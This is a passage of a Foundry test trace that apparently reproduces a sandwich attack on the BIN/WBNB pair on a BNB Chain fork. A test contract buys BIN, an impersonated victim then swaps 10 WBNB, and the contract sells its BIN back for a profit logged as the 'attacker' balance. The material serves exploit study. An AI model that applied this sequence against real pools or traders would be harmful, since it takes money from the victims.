    │   └─ ← [Return] 48305953898063254994587 [4.83e22]
    ├─ [534] WBNB::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 1000000000000000000 [1e18]
    ├─ [56138] Router::swapExactTokensForTokensSupportingFeeOnTransferTokens(1000000000000000000 [1e18], 0, [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0xe56842Ed550Ff2794F010738554db45E60730371], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1710126485 [1.71e9])
    │   ├─ [3425] WBNB::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xe432afB7283A08Be24E9038C30CA6336A7cC8218, 1000000000000000000 [1e18])
    │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xe432afB7283A08Be24E9038C30CA6336A7cC8218, value: 1000000000000000000 [1e18])
    │   │   └─ ← [Return] true
    │   ├─ [2532] BIN::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [893] 0xe432afB7283A08Be24E9038C30CA6336A7cC8218::getReserves() [staticcall]
    │   │   └─ ← [Return] 50160326469471639723 [5.016e19], 41652882184550549714540985 [4.165e25], 1710126485 [1.71e9]
    │   ├─ [534] WBNB::balanceOf(0xe432afB7283A08Be24E9038C30CA6336A7cC8218) [staticcall]
    │   │   └─ ← [Return] 51160326469471639723 [5.116e19]
    │   ├─ [41080] 0xe432afB7283A08Be24E9038C30CA6336A7cC8218::swap(0, 812168007252679721862647 [8.121e23], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
    │   │   ├─ [25986] BIN::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 812168007252679721862647 [8.121e23])
    │   │   │   ├─ emit Transfer(from: 0xe432afB7283A08Be24E9038C30CA6336A7cC8218, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 812168007252679721862647 [8.121e23])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [534] WBNB::balanceOf(0xe432afB7283A08Be24E9038C30CA6336A7cC8218) [staticcall]
    │   │   │   └─ ← [Return] 51160326469471639723 [5.116e19]
    │   │   ├─ [532] BIN::balanceOf(0xe432afB7283A08Be24E9038C30CA6336A7cC8218) [staticcall]
    │   │   │   └─ ← [Return] 40840714177297869992678338 [4.084e25]
    │   │   ├─ emit Sync(reserve0: 51160326469471639723 [5.116e19], reserve1: 40840714177297869992678338 [4.084e25])
    │   │   ├─ emit Swap(sender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0In: 1000000000000000000 [1e18], amount1In: 0, amount0Out: 0, amount1Out: 812168007252679721862647 [8.121e23], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   └─ ← [Stop] 
    │   ├─ [532] BIN::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   └─ ← [Return] 812168007252679721862647 [8.121e23]
    │   └─ ← [Stop] 
    ├─ [0] VM::startPrank(0xAb7BF20f8Ebbb286644b2C57ea448F27ef0598d4)
    │   └─ ← [Return] 
    ├─ [24420] WBNB::approve(Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   ├─ emit Approval(owner: 0xAb7BF20f8Ebbb286644b2C57ea448F27ef0598d4, spender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   └─ ← [Return] true
    ├─ [534] WBNB::balanceOf(0xAb7BF20f8Ebbb286644b2C57ea448F27ef0598d4) [staticcall]
    │   └─ ← [Return] 10000000000000000000 [1e19]
    ├─ [54138] Router::swapExactTokensForTokensSupportingFeeOnTransferTokens(10000000000000000000 [1e19], 0, [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0xe56842Ed550Ff2794F010738554db45E60730371], 0xAb7BF20f8Ebbb286644b2C57ea448F27ef0598d4, 1710126485 [1.71e9])
    │   ├─ [3425] WBNB::transferFrom(0xAb7BF20f8Ebbb286644b2C57ea448F27ef0598d4, 0xe432afB7283A08Be24E9038C30CA6336A7cC8218, 10000000000000000000 [1e19])
    │   │   ├─ emit Transfer(from: 0xAb7BF20f8Ebbb286644b2C57ea448F27ef0598d4, to: 0xe432afB7283A08Be24E9038C30CA6336A7cC8218, value: 10000000000000000000 [1e19])
    │   │   └─ ← [Return] true
    │   ├─ [2532] BIN::balanceOf(0xAb7BF20f8Ebbb286644b2C57ea448F27ef0598d4) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [893] 0xe432afB7283A08Be24E9038C30CA6336A7cC8218::getReserves() [staticcall]
    │   │   └─ ← [Return] 51160326469471639723 [5.116e19], 40840714177297869992678338 [4.084e25], 1710126485 [1.71e9]
    │   ├─ [534] WBNB::balanceOf(0xe432afB7283A08Be24E9038C30CA6336A7cC8218) [staticcall]
    │   │   └─ ← [Return] 61160326469471639723 [6.116e19]
    │   ├─ [39080] 0xe432afB7283A08Be24E9038C30CA6336A7cC8218::swap(0, 6663677900239518846527487 [6.663e24], 0xAb7BF20f8Ebbb286644b2C57ea448F27ef0598d4, 0x)
    │   │   ├─ [23986] BIN::transfer(0xAb7BF20f8Ebbb286644b2C57ea448F27ef0598d4, 6663677900239518846527487 [6.663e24])
    │   │   │   ├─ emit Transfer(from: 0xe432afB7283A08Be24E9038C30CA6336A7cC8218, to: 0xAb7BF20f8Ebbb286644b2C57ea448F27ef0598d4, value: 6663677900239518846527487 [6.663e24])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [534] WBNB::balanceOf(0xe432afB7283A08Be24E9038C30CA6336A7cC8218) [staticcall]
    │   │   │   └─ ← [Return] 61160326469471639723 [6.116e19]
    │   │   ├─ [532] BIN::balanceOf(0xe432afB7283A08Be24E9038C30CA6336A7cC8218) [staticcall]
    │   │   │   └─ ← [Return] 34177036277058351146150851 [3.417e25]
    │   │   ├─ emit Sync(reserve0: 61160326469471639723 [6.116e19], reserve1: 34177036277058351146150851 [3.417e25])
    │   │   ├─ emit Swap(sender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0In: 10000000000000000000 [1e19], amount1In: 0, amount0Out: 0, amount1Out: 6663677900239518846527487 [6.663e24], to: 0xAb7BF20f8Ebbb286644b2C57ea448F27ef0598d4)
    │   │   └─ ← [Stop] 
    │   ├─ [532] BIN::balanceOf(0xAb7BF20f8Ebbb286644b2C57ea448F27ef0598d4) [staticcall]
    │   │   └─ ← [Return] 6663677900239518846527487 [6.663e24]
    │   └─ ← [Stop] 
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return] 
    ├─ [532] BIN::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 812168007252679721862647 [8.121e23]
    ├─ [57855] Router::swapExactTokensForTokensSupportingFeeOnTransferTokens(812168007252679721862647 [8.121e23], 0, [0xe56842Ed550Ff2794F010738554db45E60730371, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1710126485 [1.71e9])
    │   ├─ [9914] BIN::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xe432afB7283A08Be24E9038C30CA6336A7cC8218, 812168007252679721862647 [8.121e23])
    │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: BIN: [0xe56842Ed550Ff2794F010738554db45E60730371], value: 121825201087901958279397 [1.218e23])
    │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xe432afB7283A08Be24E9038C30CA6336A7cC8218, value: 690342806164777763583250 [6.903e23])
    │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 115792089237316195423570985008687907853269984665640563227289576755233407777288 [1.157e77])
    │   │   └─ ← [Return] true
    │   ├─ [534] WBNB::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [893] 0xe432afB7283A08Be24E9038C30CA6336A7cC8218::getReserves() [staticcall]
    │   │   └─ ← [Return] 61160326469471639723 [6.116e19], 34177036277058351146150851 [3.417e25], 1710126485 [1.71e9]
    │   ├─ [532] BIN::balanceOf(0xe432afB7283A08Be24E9038C30CA6336A7cC8218) [staticcall]
    │   │   └─ ← [Return] 34867379083223128909734101 [3.486e25]
    │   ├─ [38256] 0xe432afB7283A08Be24E9038C30CA6336A7cC8218::swap(1207952053820379849 [1.207e18], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
    │   │   ├─ [23162] WBNB::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1207952053820379849 [1.207e18])
    │   │   │   ├─ emit Transfer(from: 0xe432afB7283A08Be24E9038C30CA6336A7cC8218, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 1207952053820379849 [1.207e18])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [534] WBNB::balanceOf(0xe432afB7283A08Be24E9038C30CA6336A7cC8218) [staticcall]
    │   │   │   └─ ← [Return] 59952374415651259874 [5.995e19]
    │   │   ├─ [532] BIN::balanceOf(0xe432afB7283A08Be24E9038C30CA6336A7cC8218) [staticcall]
    │   │   │   └─ ← [Return] 34867379083223128909734101 [3.486e25]
    │   │   ├─ emit Sync(reserve0: 59952374415651259874 [5.995e19], reserve1: 34867379083223128909734101 [3.486e25])
    │   │   ├─ emit Swap(sender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0In: 0, amount1In: 690342806164777763583250 [6.903e23], amount0Out: 1207952053820379849 [1.207e18], amount1Out: 0, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   └─ ← [Stop] 
    │   ├─ [534] WBNB::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   └─ ← [Return] 1207952053820379849 [1.207e18]
    │   └─ ← [Stop] 
    ├─ [534] WBNB::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 1207952053820379849 [1.207e18]
    ├─ emit log_named_decimal_uint(key: "Attacker WBNB balance before attack:", val: 1207952053820379849 [1.207e18], decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 2.28s (1.66s CPU time)

Ran 2 test suites in 2.28s (2.52s CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
